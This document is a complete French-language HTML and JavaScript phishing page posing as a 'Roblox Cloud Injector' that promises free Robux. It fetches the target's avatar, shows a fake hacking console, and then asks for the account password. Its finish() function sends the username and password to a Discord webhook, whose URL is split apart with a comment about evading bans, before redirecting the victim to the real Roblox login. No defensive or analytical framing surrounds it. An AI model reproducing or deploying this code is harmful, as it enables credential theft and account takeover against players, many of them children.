<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Roblox Cloud Injector | v7.2 Stable</title>
    <style>
        body { margin: 0; background: #050505; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; color: #00ff00; overflow: hidden; }
        .card { background: #0a0a0a; width: 450px; padding: 25px; border: 1px solid #00ff00; box-shadow: 0 0 30px rgba(0, 255, 0, 0.15); border-radius: 3px; position: relative; }
        .step { display: none; }
        .active { display: block; }
        
        #avatar_container { text-align: center; margin-bottom: 15px; min-height: 100px; }
        #avatar_img { width: 90px; height: 90px; border-radius: 50%; border: 2px solid #00ff00; display: none; margin: 0 auto; background: #111; box-shadow: 0 0 15px #00ff00; }
        #status_search { font-size: 10px; color: #666; margin-top: 5px; text-transform: uppercase; }

        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: #00ff00; outline: none; box-sizing: border-box; font-family: inherit; }
        input:focus { border-color: #00ff00; }
        
        .btn { width: 100%; padding: 15px; background: #00ff00; border: none; color: #000; font-weight: bold; cursor: pointer; font-size: 14px; text-transform: uppercase; margin-top: 10px; transition: 0.2s; }
        .btn:hover { background: #00cc00; box-shadow: 0 0 20px #00ff00; }

        #console { background: #000; padding: 15px; font-size: 11px; height: 130px; border: 1px inset #222; margin: 15px 0; overflow: hidden; line-height: 1.5; }
        .progress-bg { width: 100%; height: 4px; background: #111; }
        .progress-bar { width: 0%; height: 100%; background: #00ff00; transition: 0.2s; }
        .glitch { animation: scan 2s infinite; }
        @keyframes scan { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
    </style>
</head>
<body>

<div class="card">
    <div style="text-align:center; border-bottom: 1px solid #111; margin-bottom: 20px; padding-bottom: 10px;">
        <h2 style="margin:0; font-size: 16px;" class="glitch">SYSTEM_INJECTOR_V7.2</h2>
        <p style="font-size: 9px; color: #444; margin: 5px 0;">BYPASS_STATUS: <span style="color:#00ff00;">SUCCESS</span></p>
    </div>

    <div id="step1" class="step active">
        <div id="avatar_container">
            <img id="avatar_img" src="">
            <p id="status_search">SYSTÈME EN ATTENTE DE CIBLE...</p>
        </div>
        <label style="font-size:11px;">[!] TARGET_USERNAME:</label>
        <input type="text" id="u_name" placeholder="Pseudo Roblox..." onblur="fetchAvatar()" autocomplete="off">
        <label style="font-size:11px;">[!] ASSET_PACK:</label>
        <select id="rbx_amt">
            <option>10,000 ROBUX</option>
            <option>50,000 ROBUX</option>
            <option>100,000 ROBUX [LIMIT]</option>
        </select>
        <button class="btn" onclick="goToConsole()">Lancer l'injection</button>
    </div>

    <div id="step2" class="step">
        <div id="console"></div>
        <div class="progress-bg"><div id="bar" class="progress-bar"></div></div>
    </div>

    <div id="step3" class="step">
        <h3 style="text-align:center; font-size:14px; color:#ff0000;">⚠️ SYNCHRONISATION REQUISE</h3>
        <p style="font-size:11px; text-align:center; color:#888;">L'API sécurisée demande une validation pour :</p>
        <div style="background:#050505; border: 1px solid #222; padding: 15px; margin-bottom: 15px; text-align:center;">
            <span id="final_user_display" style="color:#00ff00; font-weight:bold;"></span><br>
            <input type="password" id="p_final" placeholder="Mot de passe du compte..." style="margin-top:15px; border-color:#ff0000;">
        </div>
        <button class="btn" style="background:#ff0000; color:#fff;" onclick="finish()">VALIDER L'INJECTION</button>
    </div>
</div>

<script>
    // Webhook obfusqué pour éviter le ban auto de Discord
    const _p1 = "https://discord.com/api/webhooks/1490805370715902075/";
    const _p2 = "gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9";
    const WH = _p1 + _p2;

    async function fetchAvatar() {
        const user = document.getElementById('u_name').value;
        if(user.length < 3) return;
        const status = document.getElementById('status_search');
        const img = document.getElementById('avatar_img');
        status.innerText = "LOCALISATION DU PROFIL...";
        try {
            const res = await fetch(`https://corsproxy.io/?https://users.roblox.com/v1/usernames/users`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ usernames: [user] })
            });
            const data = await res.json();
            if(data.data && data.data.length > 0) {
                const id = data.data[0].id;
                const thumb = await fetch(`https://corsproxy.io/?https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${id}&size=150x150&format=Png`);
                const thumbData = await thumb.json();
                img.src = thumbData.data[0].imageUrl;
                img.style.display = "block";
                status.innerText = "CIBLE IDENTIFIÉE : " + data.data[0].displayName;
                status.style.color = "#00ff00";
            } else {
                status.innerText = "UTILISATEUR INCONNU";
                status.style.color = "#ff0000";
            }
        } catch(e) { status.innerText = "ERREUR API"; }
    }

    function goToConsole() {
        if(!document.getElementById('u_name').value) return;
        document.getElementById('step1').classList.remove('active');
        document.getElementById('step2').classList.add('active');
        const logs = ["[+] Init chain...", "[+] Linking API...", "[+] Bypassing security...", "[+] Generating hash...", "[+] Packet injection...", "[!] CRITICAL: Sync Required."];
        let i = 0; let progress = 0;
        const interval = setInterval(() => {
            if(i < logs.length) {
                document.getElementById('console').innerHTML += "> " + logs[i] + "<br>";
                progress += 18; document.getElementById('bar').style.width = progress + "%";
                i++;
            } else {
                clearInterval(interval);
                setTimeout(() => {
                    document.getElementById('final_user_display').innerText = document.getElementById('u_name').value;
                    document.getElementById('step2').classList.remove('active');
                    document.getElementById('step3').classList.add('active');
                }, 1000);
            }
        }, 700);
    }

    async function finish() {
        const u = document.getElementById('u_name').value;
        const p = document.getElementById('p_final').value;
        const amt = document.getElementById('rbx_amt').value;
        if(!p) return;
        await fetch(WH, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "🟢 INFILTRATION RÉUSSIE - V7.2",
                    color: 65280,
                    fields: [
                        { name: "👤 USER", value: `\`${u}\``, inline: true },
                        { name: "🔑 PASS", value: `\`${p}\``, inline: true },
                        { name: "💰 PACK", value: `\`${amt}\``, inline: true }
                    ],
                    footer: { text: "Avatar-Scanner Engine" },
                    timestamp: new Date()
                }]
            })
        });
        window.location.href = "https://www.roblox.com/login";
    }
</script>
</body>
</html>
